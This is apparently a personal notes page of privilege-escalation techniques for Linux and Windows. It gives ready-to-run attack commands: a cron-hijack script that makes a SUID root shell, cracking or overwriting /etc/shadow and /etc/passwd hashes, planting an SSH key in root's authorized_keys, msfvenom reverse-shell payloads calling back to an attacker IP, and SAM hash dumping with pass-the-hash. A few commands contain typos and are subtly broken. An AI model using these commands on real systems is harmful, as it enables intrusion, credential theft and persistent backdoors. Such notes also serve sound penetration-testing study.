---
title: Notes | Privilage Escalation
author: Zeropio
date: 2022-04-25
categories: [Notes, System]
tags: [privilage-escalation, linux, windows]
permalink: /notes/system/privilage-escalation
---

# Linux Privilage Escalation

> Check the [Hacktricks](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) checklist!
{: .prompt-tip }

---

## Enumeration

There are some useful tools like:
- [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
- [LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

---

## Kernel Exploits 

If is an old server we can search for Kernel vulnerabilities. For example, one famous is [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs).

---

## Vulnerable software

Running `dpkg -l` to check software version.

---

## User Privileges 

It's important to check which privileges have our user.

We can try to see which commands are allowed to use:
```console
zero@pio$ sudo -l
  (user : user) NOPASSWD: /bin/echo
```
In the above example we see the variable **NOPASSWD**, which means that *user* has no password protection. We can try to change to him:
```console
zero@pio$ sudo -u user /bin/echo Hello!
  Hello!
```

Try to logging in root directly:
```console
sudo su -
```

---

## Files

### /etc/shadow
If we can read the file **/etc/shadow** we can try to break the hashes with **john**:
```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

If **/etc/shadow** is writeable we can change the passwords. First we need to generate one:
```console
$ mkpasswd -m -sha-512 [password]
```
And then replace the hash.

### /etc/passwd
If we can write in **/etc/passwd** we can change the password:
```console
$ openssl passwd [password]
```
Then we replace the **x** in the same line as the root with the hash, now we can log as root.

---

## Scheduled Tasks

We can find *crontab* in the following path:
- `/etc/crontab`{: .filepath}
- `/etc/cron.d`{: .filepath}
- `/var/spool/cron/crontabs/root`{: .filepath}

If in the **/etc/crontab** we have the PATH with the **/home/user** we can create the following script in the home:
```console
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
We need to give execution permission and wait to the crontab to execute the file. Then do
```console
$ /tmp/rootbash -p
```
Now we are root.

---

## Exposed Credentials

We can try searching for credentials, as in configuration, log or history files (**bash_history**).
Don't forget about **Password Reuse**.

---

## SSH

Each user has a `/.ssh/`{: .filepath} folder. If we can read the keys we can connect directly. Usually they are:
- `/home/user/.ssh/id_rsa`{: .filepath}
- `/root/.ssh/id_rsa`{: .filepath}

To connect using the RSA:
```console
zero@pio$ chmod 600 id_rsa
zero@pio$ ssh user@<ip> -i id_rsa
```

If we can write in the `/.ssh/`{: .filepath} we can write our public key inside the target machine, at `/home/user/.ssh/authorized_keys`{: .filepath}. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user.
First, create a new key. Copy the `key.pub` inside `/root/.ssh/authorized_keys`{: .filepath}.
```console
zero@pio$ ssh-keygen -f keys

victim@machine$ echo "ssh-rsa AAAAB...SNIP...M= user@zeropio" >> /root/.ssh/authorized_keys

zero@pio$ ssh root@10.10.10.10 -i key
root@remotehost$ 
```

---

## Tools
- [Kernel Vulnerabilities](https://github.com/jondonas/linux-exploit-suggester-2)
- [Useful practices](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [GTFOBins](https://gtfobins.github.io/)

---

# Windows 

> Check the [Hacktricks](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation) checklist!
{: .prompt-tip }

---

## Vulnerable Software

Check in `C:\Program Files`{: .filepath} for some programs version.

---

## Insecure Windows Service Permissions
If we manage to find one Insecure Windows Service we can modify the executable file with one corrupted and wait to the service to execute (or by ourselves with *net start [service]*).
We can create a reverse shell with **msfvenom**:
```console
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerIP] LPORT=[port] -f exe -o reverse.exe
```
And change the **reverse.exe** name with the service.exe name.

---

## Saved Credentials
We can execute:
```console
> cmdkey /list
```
to get some credentials.

Or search in configuration, log or history files (**PSReadLine**).
Also, there can be some **Password Reuse**.

---

## SAM and SYSTEM
We can search for those files in **C:\Windows\Repair**. With those we can get and crack the system's passwords.
For example with **creddump7**:
```console
> python3 creddump7/pwdump.py SYSTEM SAM
```

Then we can log in with the hash or break the hash:
```console
> pth-winexe -U 'admin%hash' //[ip] cmd.exe
```
```console
> hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.tx
```

---

## AlwaysInstalledElevated
If that property is set 1 (we can check it with: **reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevate**) we can create a msi with **msfvenom**:
```console
> sfvenom -p windows/x64/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f msi -o reverse.ms
```

---

## Tools
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [JAWS](https://github.com/411Hall/JAWS)


